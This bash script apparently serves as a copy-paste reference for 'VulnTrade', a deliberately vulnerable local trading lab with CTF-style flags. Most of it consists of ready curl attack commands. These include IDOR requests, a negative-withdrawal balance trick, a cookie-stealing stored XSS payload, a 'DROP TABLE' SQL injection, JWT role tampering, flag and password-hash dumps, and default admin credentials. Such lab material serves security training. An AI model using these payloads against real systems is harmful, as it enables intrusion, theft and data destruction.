#!/bin/bash

################################################################################
# CURL COMMAND EXAMPLES - Copy & Paste Ready
# Quick reference for common API calls
################################################################################

# Colors for output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}VulnTrade - CURL Command Examples${NC}"
echo "Copy and paste these commands directly into your terminal"
echo ""

# ==============================================================================
# AUTHENTICATION EXAMPLES
# ==============================================================================

echo -e "${YELLOW}═══ AUTHENTICATION ═══${NC}"

echo -e "${GREEN}1. Register New User:${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "newuser",
    "email": "newuser@example.com",
    "password": "password123"
  }'
EOF
echo ""

echo -e "${GREEN}2. Login (Admin):${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin123"
  }'
EOF
echo ""

echo -e "${GREEN}3. Login (Trader 1):${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "trader1",
    "password": "password"
  }'
EOF
echo ""

echo -e "${GREEN}4. Save JWT to Variable (for future requests):${NC}"
cat << 'EOF'
export JWT=$(curl -s -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"trader1","password":"password"}' \
  | grep -o '"jwt":"[^"]*' | cut -d'"' -f4)
echo $JWT
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - IDOR
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: IDOR (Insecure Direct Object Reference) ═══${NC}"

echo -e "${GREEN}1. View Admin Profile (as Trader - IDOR):${NC}"
cat << 'EOF'
# First login as trader1 and save JWT
export TRADER_JWT="<insert-trader1-jwt-here>"

# Then view admin's profile
curl -X GET http://localhost:8085/api/users/1 \
  -H "Authorization: Bearer $TRADER_JWT"

# Response includes: admin's email, balance, API key, FLAG 2 in notes
EOF
echo ""

echo -e "${GREEN}2. View Any User's Portfolio (as Any Other User - IDOR):${NC}"
cat << 'EOF'
curl -X GET http://localhost:8085/api/users/3/portfolio \
  -H "Authorization: Bearer $TRADER_JWT"

# See: Trader 2's positions, cash, total value, unrealized P&L
EOF
echo ""

echo -e "${GREEN}3. Cancel Other User's Order (as Different User - IDOR):${NC}"
cat << 'EOF'
# Place order as trader2 (order ID 101)
# Then cancel as trader1:
curl -X POST http://localhost:8085/api/orders/101/cancel \
  -H "Authorization: Bearer $TRADER_JWT"

# Order gets cancelled even though you don't own it!
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - SIGN FLIP
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: Sign Flip (Negative Withdraw = Deposit) ═══${NC}"

echo -e "${GREEN}Deposit Money by Sending Negative Withdraw:${NC}"
cat << 'EOF'
# Withdraw -$1000 = Deposit +$1000!
curl -X POST http://localhost:8085/api/accounts/withdraw \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "amount": -10000,
    "destinationAccount": "0xfake"
  }'

# Balance increases by $10,000 instead of decreasing!
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - INPUT VALIDATION
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: Input Validation Issues ═══${NC}"

echo -e "${GREEN}1. Place Order with Negative Quantity:${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/orders \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "AAPL",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": -100,
    "price": 150.00,
    "clientOrderId": "order_'$(date +%s)'"
  }'

# Backend accepts negative quantity!
EOF
echo ""

echo -e "${GREEN}2. Place Order with Non-existent Symbol:${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/orders \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "FAKE_XYZ_9999",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": 10,
    "price": 100.00,
    "clientOrderId": "fake_'$(date +%s)'"
  }'

# Backend accepts non-existent symbols!
EOF
echo ""

echo -e "${GREEN}3. Place Order with Extreme Price:${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/orders \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "AAPL",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": 1,
    "price": 0.01,
    "clientOrderId": "extreme_'$(date +%s)'"
  }'

# Backend accepts extreme prices!
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - STORED XSS
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: Stored XSS (via Alert Symbol) ═══${NC}"

echo -e "${GREEN}Create Alert with XSS Payload:${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/alerts \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "<img src=x onerror=\"alert(document.cookie)\">",
    "targetPrice": 100,
    "direction": "UP"
  }'

# Payload stored in database
# When fetched and rendered in DashboardPage via dangerouslySetInnerHTML
# The XSS payload executes!
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - INFORMATION DISCLOSURE
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: Information Disclosure ═══${NC}"

echo -e "${GREEN}1. Get Flags from Actuator (Phase 1):${NC}"
cat << 'EOF'
curl http://localhost:8085/actuator/env | grep -i flag

# Returns: All FLAGS exposed in environment variables
EOF
echo ""

echo -e "${GREEN}2. Get All Users with Hashes (Phase 1):${NC}"
cat << 'EOF'
curl http://localhost:8085/api/debug/user-info

# Returns: All users with password hashes and API keys
EOF
echo ""

echo -e "${GREEN}3. Get API Key from Balance Endpoint:${NC}"
cat << 'EOF'
curl http://localhost:8085/api/users/2 \
  -H "Authorization: Bearer $TRADER_JWT"

# Response includes: apiKey, role, notes (may have flags)
EOF
echo ""

echo -e "${GREEN}4. See User IDs in Trade Broadcasts:${NC}"
cat << 'EOF'
# When you view trades, response includes:
# "buyUserId": 2,
# "sellUserId": 3,
# Exposes who is trading with whom
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - SQL INJECTION
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: SQL Injection ═══${NC}"

echo -e "${GREEN}Trade History with SQL Injection:${NC}"
cat << 'EOF'
curl -X POST http://localhost:8085/api/trades/history \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "startDate": "2026-01-01",
    "endDate": "2026-12-31\"; DROP TABLE trades; --",
    "symbol": "AAPL"
  }'

# Parameters passed to raw SQL (not parameterized)
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - JWT MANIPULATION
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: JWT Role in Token Body (Modifiable) ═══${NC}"

echo -e "${GREEN}Decode JWT to See Role:${NC}"
cat << 'EOF'
# Get JWT from login
JWT="<your-jwt-here>"

# Extract and decode payload
echo $JWT | cut -d'.' -f2 | base64 -D | jq .

# Response shows: "role":"TRADER" (modifiable!)
# Could change to "role":"ADMIN" in browser console
EOF
echo ""

echo -e "${GREEN}Attempt Admin Operation with Trader JWT:${NC}"
cat << 'EOF'
# Try to adjust balance as trader (role check from JWT body!)
curl -X POST http://localhost:8085/api/admin/adjust-balance \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": 1,
    "amount": 10000,
    "reason": "hacked"
  }'

# May succeed if signature validation is weak!
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - AUTHENTICATION BYPASS
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: Authentication Bypass ═══${NC}"

echo -e "${GREEN}1. API Key in URL Parameter (VULNERABILITY - Shows in History):${NC}"
cat << 'EOF'
# API key visible in browser history, logs, referrer headers!
curl "http://localhost:8085/api/users/1?api_key=STATIC_API_KEY_ADMIN"

# Response: User profile (authenticated via URL parameter)
EOF
echo ""

echo -e "${GREEN}2. API Key via Header:${NC}"
cat << 'EOF'
curl -X GET http://localhost:8085/api/users/1 \
  -H "X-API-Key: STATIC_API_KEY_ADMIN"

# Response: User profile (authenticated via header)
EOF
echo ""

# ==============================================================================
# VULNERABILITY EXAMPLES - USER ENUMERATION
# ==============================================================================

echo -e "${YELLOW}═══ VULNERABILITY: User Enumeration ═══${NC}"

echo -e "${GREEN}Compare Login Error Messages:${NC}"
cat << 'EOF'
# Valid user, wrong password
curl -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass"}'
# Response: "Invalid credentials"

# Invalid user
curl -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent_xyz","password":"wrongpass"}'
# Response: "User not found"

# DIFFERENT MESSAGES = User enumeration possible!
EOF
echo ""

# ==============================================================================
# USEFUL COMMANDS
# ==============================================================================

echo -e "${YELLOW}═══ USEFUL COMMANDS ═══${NC}"

echo -e "${GREEN}Health Check:${NC}"
cat << 'EOF'
curl http://localhost:8085/api/health
EOF
echo ""

echo -e "${GREEN}Check Service Ports:${NC}"
cat << 'EOF'
# Check if services are running
lsof -i :8085  # Backend
lsof -i :3001  # Frontend
lsof -i :5432  # Database
lsof -i :6379  # Redis
EOF
echo ""

echo -e "${GREEN}View Docker Logs:${NC}"
cat << 'EOF'
# Backend logs
docker-compose logs -f backend

# All services
docker-compose logs -f
EOF
echo ""

echo -e "${GREEN}Pretty Print JSON Responses:${NC}"
cat << 'EOF'
# Install jq: brew install jq
curl http://localhost:8085/api/health | jq .

# Or use python
curl http://localhost:8085/api/health | python -m json.tool
EOF
echo ""

# ==============================================================================
# WORKFLOW EXAMPLES
# ==============================================================================

echo -e "${YELLOW}═══ COMPLETE WORKFLOWS ═══${NC}"

echo -e "${GREEN}Workflow 1: Register → Login → Place Order:${NC}"
cat << 'EOF'
#!/bin/bash

# 1. Register
RESPONSE=$(curl -s -X POST http://localhost:8085/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "user_'$(date +%s)'",
    "email": "user_'$(date +%s)'@example.com",
    "password": "pass123"
  }')

JWT=$(echo $RESPONSE | grep -o '"jwt":"[^"]*' | cut -d'"' -f4)

# 2. Place order
curl -X POST http://localhost:8085/api/orders \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "AAPL",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": 10,
    "price": 150.00,
    "clientOrderId": "order_'$(date +%s)'"
  }'
EOF
echo ""

echo -e "${GREEN}Workflow 2: IDOR Attack - View Other Portfolio:${NC}"
cat << 'EOF'
#!/bin/bash

# Login as trader1
TRADER1=$(curl -s -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"trader1","password":"password"}')

JWT=$(echo $TRADER1 | grep -o '"jwt":"[^"]*' | cut -d'"' -f4)

# Access trader2's portfolio (IDOR!)
curl -X GET http://localhost:8085/api/users/3/portfolio \
  -H "Authorization: Bearer $JWT" | jq .
EOF
echo ""

echo -e "${GREEN}Workflow 3: Admin Login → View All Users:${NC}"
cat << 'EOF'
#!/bin/bash

# Admin login
ADMIN=$(curl -s -X POST http://localhost:8085/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}')

JWT=$(echo $ADMIN | grep -o '"jwt":"[^"]*' | cut -d'"' -f4)

# View all users
curl -X GET http://localhost:8085/api/admin/users \
  -H "Authorization: Bearer $JWT" | jq .
EOF
echo ""

echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo "🎯 Tip: Copy any command above and paste into your terminal"
echo "💡 Pro Tip: Use jq to pretty-print JSON responses"
echo "📚 More: Read docs/TESTING.md and docs/API-REFERENCE.md"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
